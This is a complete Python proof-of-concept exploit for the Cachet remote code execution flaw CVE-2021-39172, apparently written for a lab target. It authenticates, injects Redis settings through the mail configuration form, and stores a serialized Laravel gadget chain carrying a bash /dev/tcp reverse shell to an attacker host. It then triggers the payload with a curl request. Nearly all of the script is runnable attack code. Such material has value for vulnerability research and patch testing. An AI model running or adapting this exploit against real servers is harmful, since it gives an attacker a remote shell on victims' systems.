import requests
import re
import argparse
import os
import redis



parser = argparse.ArgumentParser(description='Cachet Remote Code Execution CVE-2021-39172 PoC.\
        \n\n [!] You need redis installed  \n\n sudo apt install redis-server', formatter_class=argparse.RawTextHelpFormatter)

parser.add_argument('--lp', dest='local_port', action='store', required=True,
                    help='port for the reverse shell')
parser.add_argument('--lh', dest='local_host', action='store', required=True,
                    help='your machine ip to link the victim redis server and for the reverse shell')
parser.add_argument('-u', dest='username', action='store', required=True,
                    help='username or email to authenticate with')
parser.add_argument('-p', dest='password', action='store', required=True,
                    help='password to authenticate with')
parser.add_argument('--url', dest='url', action='store', required=True,
                    help='URL of the web application')
parser.add_argument('-x', dest='proxy', action='store',
                    help='Proxy to use')
args = parser.parse_args()




s = requests.session()
s.trust_env = False
s.proxies.update({"http": args.proxy, "https": args.proxy})



var = f"""\
file
REDIS_HOST={args.local_host}
REDIS_DATABASE=0
REDIS_PORT=6379
SESSION_DRIVER=redis"""



obj = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{S:9:"\00*\00events";O:25:"Illuminate\Bus\Dispatcher":5:{S:12:"\00*\00container";N;S:11:"\00*\00pipeline";N;S:8:"\00*\00pipes";a:0:{}S:11:"\00*\00handlers";a:0:{}S:16:"\00*\00queueResolver";S:6:"system";}S:8:"\00*\00event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{S:10:"connection";S:55:"/bin/bash -c "bash -i >& /dev/tcp/'

obj += f'{args.local_host}/{args.local_port} 0>&1"";}}'




def get_token():
    try:
        print("[+] Extracting the csrf token to log in...")
        token = re.search(r'name="token" content="(.*?)"', s.get(args.url).text).group(1)
        return token
    except AttributeError:
        print("[-] Something gone wrong with the csrf token extraction!")
        os.system("pkill redis-server")
        exit()





def auth():
        res = s.post(args.url + "/auth/login", data={"_token": token, "username": args.username, "password": args.password}, allow_redirects=False).headers['Location']

        if "dashboard" in res:
            print(f"[+] Successfully logged in as {args.username}")
        else:
            print("[-] Wrong creds!")
            os.system("pkill redis-server")
            exit()





def insert_var():
    x = {
    "_token": (None, token), 
    "config[cache_driver]": (None, var),
    "config[mail_host]": (None, ""),
    "config[mail_address]": (None, "notify@10.129.136.74"),
    "config[mail_username]": (None, ""),
    "config[mail_password]": (None, "")
    }

    print("[+] inserting the varibles...")
    res = s.post(args.url + "/dashboard/settings/mail", files=x)
    if "200" in str(res):
        print("[+] The insertion of the variables was successfull")
    else:
        print("[-] Something gone wrong with the variables insertion!")
        os.system("pkill redis-server")
        exit()

        



def rev_shell():
    print("[+] Triggering the reverse shell...")
    r.set(str(r.keys())[3:-2], obj)
    
    req = f"curl {args.url}/dashboard/settings/mail --cookie '"
    for key in s.cookies.keys():
        req += f"{key}={s.cookies[key]};"
    
    req = req.strip(";")
    req += "' -so /dev/null &"
    os.system(req)
     
    os.system("sleep 15s") 
    print("[+] exiting...")
    os.system("pkill redis-server")
    os.system("pkill curl")
    exit()

    


    



print("[+] setting up the redis server...")
os.system("redis-server --protected-mode no &")
r = redis.Redis(host='127.0.0.1', port='6379')


token = get_token()
auth()
insert_var()
rev_shell()



